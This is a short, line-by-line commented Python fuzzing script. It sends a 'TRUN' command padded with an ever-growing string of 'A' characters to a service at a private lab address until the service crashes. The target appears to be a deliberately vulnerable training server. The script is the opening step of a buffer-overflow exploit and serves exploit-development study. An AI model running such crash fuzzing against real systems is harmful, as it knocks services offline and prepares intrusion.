# The above line is a shebang that tells the system to execute the script using the Python interpreter.
#!/usr/bin/python
 
# Importing essential modules:
# sys for system-specific parameters and functions.
# socket for network-related operations.
# sleep from time to introduce delays in the script.
import sys, socket
from time import sleep
 
# Initial buffer containing 100 'A' characters. This will be sent to the server to test its handling of input size.
buffer = "A" * 100
 
# Infinite loop to continuously send payloads until the program crashes.
while True:
    try:
# Constructing the payload by appending the buffer to the command.
        payload = "TRUN /.:/" + buffer
 
# Creating a TCP socket for network communication.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connecting to the target server at IP 192.168.1.35 on port 9999.
        s.connect(('192.168.1.35',9999))
# Printing the message indicating the payload is being sent and displaying the current buffer size.
        print ("[+] Sending the payload...\n" + str(len(buffer)))
# Sending the encoded payload to the server.
        s.send((payload.encode()))
# Closing the socket connection.
        s.close()
# Introducing a delay of 1 second before sending the next payload.
        sleep(1)
# Increasing the buffer size by 100 'A' characters for the next iteration to test larger payloads.
        buffer = buffer + "A"*100
# Exception handling to manage potential errors during execution.
    except:
# Printing message indicating where the fuzzing process crashed (i.e., the buffer size).
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
# Exiting the program after the crash.
        sys.exit()
